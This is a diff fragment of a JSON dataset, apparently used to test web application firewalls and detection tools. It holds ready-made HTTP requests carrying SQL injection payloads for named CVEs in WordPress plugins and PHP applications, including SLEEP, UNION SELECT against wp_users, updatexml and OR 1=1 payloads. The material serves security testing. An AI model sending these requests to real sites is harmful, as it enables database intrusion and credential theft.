+    "description": "The Better Search Replace WordPress plugin before 1.4.1 does not sanitise table data before using it in a SQL query, allowing Admin+ SQL injection. Per the WPScan advisory the request is POST to wp-admin/tools.php?page=better-search-replace&bsr-ajax=process_search_replace with a select_tables[] table name (inside the bsr_data field) carrying a time-based (SLEEP) payload. Nonces are dummy (the WAF inspects before the app). Built from the WPScan advisory.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/229a065e-1062-44d4-818d-29aa3b6b6d41 (WPScan advisory with PoC)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/tools.php?page=better-search-replace&bsr-ajax=process_search_replace HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_logged_in=dummy\n\naction=process_search_replace&bsr_ajax_nonce=dummy&bsr_nonce=dummy&bsr_data=%7B%22select_tables%22%3A%5B%22wp_posts%60%20WHERE%201%3DSLEEP(5)--%20-%22%5D%7D\n"
+    },
+    "cves": [
+      "CVE-2022-2593"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "waf_rule_wpscan for CVE-2022-2593",
+        "link": "https://wpscan.com/vulnerability/229a065e-1062-44d4-818d-29aa3b6b6d41"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-2577 - SourceCodester Garage Management System SQL Injection",
+    "displayName": "CVE-2022-2577 - SourceCodester Garage Management System SQL Injection",
+    "description": "SourceCodester Garage Management System 1.0 is vulnerable to SQL injection in the id argument of /edituser.php. The CVE description and PoC give the exact injectable URL -2' UNION select 11,user(),333,444--+. The request sends that UNION SELECT payload (GET) in id. No vendor WAF rule found; built from the VulDB description and PoC.\n\nReferences used to recreate this request:\n- https://github.com/ch0ing/vul/blob/main/WebRay.com.cn/Garage%20Management%20System%28SQLI%29.md (PoC)\n- https://vuldb.com/?id.205300 (VulDB entry point)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /edituser.php?id=-2%27%20UNION%20select%2011,user(),333,444--+ HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-2577"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-2577",
+        "link": "https://github.com/ch0ing/vul/blob/main/WebRay.com.cn/Garage%20Management%20System%28SQLI%29.md"
+      },
+      {
+        "title": "vuldb for CVE-2022-2577",
+        "link": "https://vuldb.com/?id.205300"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-2559 - Fluent Support WordPress Plugin SQL Injection",
+    "displayName": "CVE-2022-2559 - Fluent Support WordPress Plugin SQL Injection",
+    "description": "The Fluent Support WordPress plugin before 1.5.8 does not sanitise parameters before using them in a SQL statement, allowing Admin+ SQL injection. Per the WPScan advisory the injection is in order_by on the REST route /fluent-support/v2/tickets (reached via rest_route). The request sends a time-based (SLEEP) payload in order_by. Method GET (the PoC is a plain URL). Nonce is dummy. Built from the WPScan advisory.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/062599ce-c630-487e-bb43-c3b27a62b9ec (WPScan advisory with PoC)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /?rest_route=/fluent-support/v2/tickets&page=1&per_page=10&order_by=priority%60%3D%60priority%60%20AND%20(SELECT%209285%20FROM%20(SELECT(SLEEP(5)))BuXj)%20AND%20%60priority%60%3D%60priority&order_type=ASC&_wpnonce=dummy HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-2559"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "waf_rule_wpscan for CVE-2022-2559",
+        "link": "https://wpscan.com/vulnerability/062599ce-c630-487e-bb43-c3b27a62b9ec"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-2492 - SourceCodester Library Management System SQL Injection",
+    "displayName": "CVE-2022-2492 - SourceCodester Library Management System SQL Injection",
+    "description": "SourceCodester Library Management System 1.0 is vulnerable to SQL injection in the RollNo argument of /index.php (login). The CVE description and PoC give the input admin' AND (SELECT 2625 FROM (SELECT(SLEEP(5)))MdIL) AND 'KXmq'='KXmq with Password. The request sends that time-based payload as a POST login (RollNo + Password form). No vendor WAF rule found; built from the VulDB description and PoC.\n\nReferences used to recreate this request:\n- https://github.com/xiahao90/CVEproject/blob/main/xiahao.webray.com.cn/Library-Management-System-with-QR-code-Attendance-and-Auto-Generate-Library-Card.md#index.php (PoC)\n- https://vuldb.com/?id.204575 (VulDB entry point)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /index.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nRollNo=admin%27%20AND%20(SELECT%202625%20FROM%20(SELECT(SLEEP(5)))MdIL)%20AND%20%27KXmq%27%3D%27KXmq&Password=1231312312\n"
+    },
+    "cves": [
+      "CVE-2022-2492"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-2492",
+        "link": "https://github.com/xiahao90/CVEproject/blob/main/xiahao.webray.com.cn/Library-Management-System-with-QR-code-Attendance-and-Auto-Generate-Library-Card.md#index.php"
+      },
+      {
+        "title": "vuldb for CVE-2022-2492",
+        "link": "https://vuldb.com/?id.204575"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-2491 - SourceCodester Library Management System SQL Injection",
+    "displayName": "CVE-2022-2491 - SourceCodester Library Management System SQL Injection",
+    "description": "SourceCodester Library Management System 1.0 is vulnerable to SQL injection in the Section argument of lab.php. The CVE description and PoC give a UNION ALL SELECT ... payload in Section. The request sends that UNION-based payload; HTTP method GET inferred (section/view-style parameter). No vendor WAF rule found; built from the VulDB description and PoC.\n\nReferences used to recreate this request:\n- https://github.com/xiahao90/CVEproject/blob/main/xiahao.webray.com.cn/Library-Management-System-with-QR-code-Attendance-and-Auto-Generate-Library-Card.md (PoC)\n- https://vuldb.com/?id.204574 (VulDB entry point)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /lab.php?Section=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,CONCAT(0x71716b7171,0x546e4444736b7743575a666d4873746a6450616261527a67627944426946507245664143694c6a4c,0x7162706b71),NULL,NULL,NULL,NULL%23 HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-2491"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-2491",
+        "link": "https://github.com/xiahao90/CVEproject/blob/main/xiahao.webray.com.cn/Library-Management-System-with-QR-code-Attendance-and-Auto-Generate-Library-Card.md"
+      },
+      {
+        "title": "vuldb for CVE-2022-2491",
+        "link": "https://vuldb.com/?id.204574"
       }
     ],
     "public": false,
@@ -395214,6 +396174,750 @@
       {
         "title": "vuldb for CVE-2026-5579",
         "link": "https://vuldb.com/vuln/355349"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-0267 - AdRotate WordPress Plugin SQL Injection",
+    "displayName": "CVE-2022-0267 - AdRotate WordPress Plugin SQL Injection",
+    "description": "The AdRotate WordPress plugin before 5.8.22 does not sanitise/escape the adrotate_action parameter before using it in a SQL statement in the adrotate_request_action function (admin dashboard, POST to /wp-admin/). The request sends a time-based SQLi payload (where sleep) in adrotate_action. Method POST and parameter taken directly from the WPScan PoC. No vendor WAF rule found; built from the WPScan PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/7df70f49-547f-4bdb-bf9b-2e06f93488c6 (PoC/advisory)\n- https://www.cve.org/CVERecord?id=CVE-2022-0267 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/ HTTP/1.1\nHost: {{target_host}}\nX-Requested-With: XMLHttpRequest\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nCookie: wordpress_logged_in=dummy\n\nadrotate_action_submit=1&adrotate_nonce=dummy&adrotate_action=renew-1+where+sleep(5)%23&bannercheck%5B%5D=1\n"
+    },
+    "cves": [
+      "CVE-2022-0267"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2022-0267",
+        "link": "https://wpscan.com/vulnerability/7df70f49-547f-4bdb-bf9b-2e06f93488c6"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-0255 - Database Backup for WordPress SQL Injection",
+    "displayName": "CVE-2022-0255 - Database Backup for WordPress SQL Injection",
+    "description": "The Database Backup for WordPress plugin before 2.5.1 does not sanitise/escape the fragment parameter before using it in a SQL statement (admin dashboard). The GET request sends an error-based SQLi payload (select updatexml) in fragment. Path and parameter from the WPScan PoC. No vendor WAF rule found; built from the WPScan PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/684bb06d-864f-4cba-ab0d-f83974d026fa (PoC/advisory)\n- https://www.cve.org/CVERecord?id=CVE-2022-0255 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/?fragment=select%20updatexml(1,concat(0x7e,(select%20user())),0)&_wpnonce=dummy HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-0255"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2022-0255",
+        "link": "https://wpscan.com/vulnerability/684bb06d-864f-4cba-ab0d-f83974d026fa"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-0254 - WordPress Zero Spam SQL Injection",
+    "displayName": "CVE-2022-0254 - WordPress Zero Spam SQL Injection",
+    "description": "The WordPress Zero Spam plugin before 5.2.11 does not sanitise/escape the order and orderby parameters before using them in a SQL statement in the admin dashboard (page=wordpress-zero-spam-dashboard&tab=blocked). The GET request sends a time-based SQLi payload (and sleep(5)) in orderby. Path and parameters from the WPScan PoC. No vendor WAF rule found; built from the WPScan PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/ae54681f-7b89-408c-b0ee-ba4a520db997 (PoC/advisory)\n- https://www.cve.org/CVERecord?id=CVE-2022-0254 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/?page=wordpress-zero-spam-dashboard&tab=blocked&orderby=1%20and%20sleep(5)&order=desc HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-0254"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2022-0254",
+        "link": "https://wpscan.com/vulnerability/ae54681f-7b89-408c-b0ee-ba4a520db997"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-0228 - Popup Builder WordPress Plugin SQL Injection",
+    "displayName": "CVE-2022-0228 - Popup Builder WordPress Plugin SQL Injection",
+    "description": "The Popup Builder plugin before 4.0.7 does not validate/escape the orderby and order parameters before using them in a SQL statement via the csv_file admin-post action. The GET request to /wp-admin/admin-post.php?action=csv_file sends a time-based SQLi payload (select sleep) in orderby. Path and parameters from the WPScan PoC. No vendor WAF rule found; built from the WPScan PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/22facac2-52f4-4e5f-be59-1d2934b260d9 (PoC/advisory)\n- https://www.cve.org/CVERecord?id=CVE-2022-0228 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/admin-post.php?action=csv_file&orderby=email%2c(select+*+from(select(sleep(5)))b)&order=desc HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-0228"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2022-0228",
+        "link": "https://wpscan.com/vulnerability/22facac2-52f4-4e5f-be59-1d2934b260d9"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-0190 - Ad Invalid Click Protector (AICP) SQL Injection",
+    "displayName": "CVE-2022-0190 - Ad Invalid Click Protector (AICP) SQL Injection",
+    "description": "The Ad Invalid Click Protector (AICP) plugin before 1.2.6 is affected by SQL injection in the id parameter of the delete action on the aicp_banned_user_details admin page. The GET request sends a boolean-based SQLi payload (OR 1=1) in id. Path and parameter from the WPScan PoC. No vendor WAF rule found; built from the WPScan PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/ae322f11-d8b4-4b69-9efa-0fb87475fa44 (PoC/advisory)\n- https://www.cve.org/CVERecord?id=CVE-2022-0190 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/admin.php?page=aicp_banned_user_details&action=delete&id=0)%20OR%201=1%20--%20k HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-0190"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2022-0190",
+        "link": "https://wpscan.com/vulnerability/ae322f11-d8b4-4b69-9efa-0fb87475fa44"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-0169 - Photo Gallery by 10Web SQL Injection",
+    "displayName": "CVE-2022-0169 - Photo Gallery by 10Web SQL Injection",
+    "description": "The Photo Gallery by 10Web plugin before 1.6.0 does not validate/escape the bwg_tag_id_bwg_thumbnails_0 parameter before using it in a SQL statement via the bwg_frontend_data AJAX action (unauthenticated). The GET request to /wp-admin/admin-ajax.php sends a UNION-based SQLi payload targeting wp_users in bwg_tag_id_bwg_thumbnails_0[]. Path, AJAX action and parameter from the WPScan PoC. No vendor WAF rule found; built from the WPScan PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/0b4d870f-eab8-4544-91f8-9c5f0538709c (PoC/advisory)\n- https://plugins.trac.wordpress.org/changeset/2672822/photo-gallery (fix)\n- https://www.cve.org/CVERecord?id=CVE-2022-0169 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1&bwg_tag_id_bwg_thumbnails_0%5B%5D=-1)%20UNION%20SELECT%20user_login,user_pass%20FROM%20wp_users--%20- HTTP/1.1\nHost: {{target_host}}\n\n"
+    },
+    "cves": [
+      "CVE-2022-0169"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2022-0169",
+        "link": "https://wpscan.com/vulnerability/0b4d870f-eab8-4544-91f8-9c5f0538709c"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-48008 - Chanjet CRM SQL Injection",
+    "displayName": "CVE-2021-48008 - Chanjet CRM SQL Injection",
+    "description": "Chanjet CRM contains an unauthenticated UNION-based SQL injection via the site_id GET parameter in the usedspace.php webservice endpoint. The GET request sends a UNION SELECT payload in site_id. Parameter, method (GET) and attack class are from the CVE description and the VulnCheck advisory; the endpoint file name usedspace.php is inferred from the VulnCheck advisory slug (exact install path may vary). A Nuclei template exists (chanjet-crm-sqli.yaml) but could not be retrieved.\n\nReferences used to recreate this request:\n- https://www.vulncheck.com/advisories/chanjet-crm-sql-injection-via-get-usedspace-php (advisory, blocked - path inferred from slug)\n- https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/http/vulnerabilities/chanjet-tplus/chanjet-crm-sqli.yaml (nuclei template)\n- https://www.cve.org/CVERecord?id=CVE-2021-48008 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /usedspace.php?site_id=-1%20UNION%20SELECT%201,2,3,user(),database()--%20- HTTP/1.1\nHost: {{target_host}}\n\n"
+    },
+    "cves": [
+      "CVE-2021-48008"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_nuclei for CVE-2021-48008",
+        "link": "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/http/vulnerabilities/chanjet-tplus/chanjet-crm-sqli.yaml"
+      },
+      {
+        "title": "waf_rule_vulncheck for CVE-2021-48008",
+        "link": "https://www.vulncheck.com/advisories/chanjet-crm-sql-injection-via-get-usedspace-php"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-47980 - Fuel CMS Blind SQL Injection",
+    "displayName": "CVE-2021-47980 - Fuel CMS Blind SQL Injection",
+    "description": "Fuel CMS 1.4.13 contains an authenticated blind SQL injection via the col parameter of the Activity Log endpoint /fuel/logs/items. The GET request sends a time-based SQLi payload (select sleep) in col. Path, parameter and request shape from the Exploit-DB PoC (50523). No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://www.exploit-db.com/exploits/50523 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-47980 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /fuel/logs/items?type=debug&search_term=&limit=50&view_type=list&offset=0&order=desc&col=entry_date%20and%20(select%20*%20from(select(sleep(5)))a)&fuel_inline=0 HTTP/1.1\nHost: {{target_host}}\nCookie: fuelcms_session=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-47980"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_exploitdb for CVE-2021-47980",
+        "link": "https://www.exploit-db.com/exploits/50523"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-47966 - PHP Timeclock SQL Injection",
+    "displayName": "CVE-2021-47966 - PHP Timeclock SQL Injection",
+    "description": "PHP Timeclock 1.04 contains an unauthenticated time-based/boolean blind SQL injection in the login_userid parameter of login.php. The POST request sends a SLEEP-based SQLi payload in login_userid. Path (login.php), parameter (login_userid), method (POST) and attack class from the CVE description/VulnCheck advisory; the supporting form fields (login_password, action) are inferred form fields (FLAGGED). No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://www.exploit-db.com/exploits/49849 (PoC)\n- https://www.vulncheck.com/advisories/php-timeclock-sql-injection-via-login-php (advisory)\n- https://www.cve.org/CVERecord?id=CVE-2021-47966 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /login.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nlogin_userid=admin'+AND+SLEEP(5)--+-&login_password=dummy&action=login\n"
+    },
+    "cves": [
+      "CVE-2021-47966"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_exploitdb for CVE-2021-47966",
+        "link": "https://www.exploit-db.com/exploits/49849"
+      },
+      {
+        "title": "waf_rule_vulncheck for CVE-2021-47966",
+        "link": "https://www.vulncheck.com/advisories/php-timeclock-sql-injection-via-login-php"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-0153 - Fork CMS SQL Injection",
+    "displayName": "CVE-2022-0153 - Fork CMS SQL Injection",
+    "description": "Fork CMS before 5.11.1 is vulnerable to SQL injection via the id[] parameter when deleting form submissions in the backend FormBuilder module. The POST request sends a time-based SQLi payload (AND SLEEP) in id[]. The vulnerable parameter id[] and FormBuilder module are confirmed by the GitHub advisory; the exact backend action path (/private/en/form_builder/data) is reconstructed from Fork CMS backend routing conventions (FLAGGED - path reconstructed). Method POST inferred for a delete/mass action (FLAGGED).\n\nReferences used to recreate this request:\n- https://github.com/advisories/GHSA-q863-cchm-c6c6 (advisory - names id[] parameter)\n- https://github.com/forkcms/forkcms/commit/7a12046a67ae5d8cf04face3ee75e55f03a1a608 (fix commit)\n- https://www.cve.org/CVERecord?id=CVE-2022-0153 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /private/en/form_builder/data HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: frontend_session=dummy\n\naction=delete&id%5B%5D=1)%20AND%20SLEEP(5)--%20-\n"
+    },
+    "cves": [
+      "CVE-2022-0153"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-0153",
+        "link": "https://github.com/advisories/GHSA-q863-cchm-c6c6"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-47811 - Grocery CRUD SQL Injection",
+    "displayName": "CVE-2021-47811 - Grocery CRUD SQL Injection",
+    "description": "Grocery CRUD 1.6.4 is vulnerable to SQL injection via the order_by[] parameter sent in a POST request to the ajax_list endpoint; order_by[0]/order_by[1] are passed unsanitised into the ORDER BY clause. This request injects a time-based SQL payload in order_by[0]. No vendor WAF rule found; built from the ExploitDB PoC and CVE description. Install folder/demo controller in the path follows the sibling Grocery CRUD ExploitDB PoC and is flagged as inferred.\n\nReferences used to recreate this request:\n- https://www.exploit-db.com/exploits/49985 (PoC - blocked at fetch time, used via CVE/metadata)\n- https://www.vulncheck.com/advisories/grocery-crud-orderby-sql-injection (advisory)\n- https://www.cve.org/CVERecord?id=CVE-2021-47811 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /index.php/examples/customers_management/ajax_list HTTP/1.1\nHost: {{target_host}}\nCookie: ci_session=dummy\nContent-Type: application/x-www-form-urlencoded\n\norder_by%5B0%5D=1%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(5)))x)&order_by%5B1%5D=ASC&page=1\n"
+    },
+    "cves": [
+      "CVE-2021-47811"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_exploitdb for CVE-2021-47811",
+        "link": "https://www.exploit-db.com/exploits/49985"
+      },
+      {
+        "title": "advisory_vulncheck for CVE-2021-47811",
+        "link": "https://www.vulncheck.com/advisories/grocery-crud-orderby-sql-injection"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-47766 - Level Programs Kmaleon SQL Injection",
+    "displayName": "CVE-2021-47766 - Level Programs Kmaleon SQL Injection",
+    "description": "Kmaleon 1.1.0.205 is vulnerable to authenticated SQL injection in the tipocomb parameter of kmaleonW.php (boolean/error/time-based). This request sends a time-based SQL payload in tipocomb. No vendor WAF rule found; built from the ExploitDB PoC and CVE description. HTTP method is inferred as GET (tipocomb is a type/combo selector) and FLAGGED as inferred.\n\nReferences used to recreate this request:\n- https://www.exploit-db.com/exploits/50499 (PoC - blocked at fetch time, used via CVE/metadata)\n- https://www.cve.org/CVERecord?id=CVE-2021-47766 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /kmaleonW.php?tipocomb=1'%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(5)))x)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-47766"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_exploitdb for CVE-2021-47766",
+        "link": "https://www.exploit-db.com/exploits/50499"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-47763 - Aimeos Laravel JSON API SQL Injection",
+    "displayName": "CVE-2021-47763 - Aimeos Laravel JSON API SQL Injection",
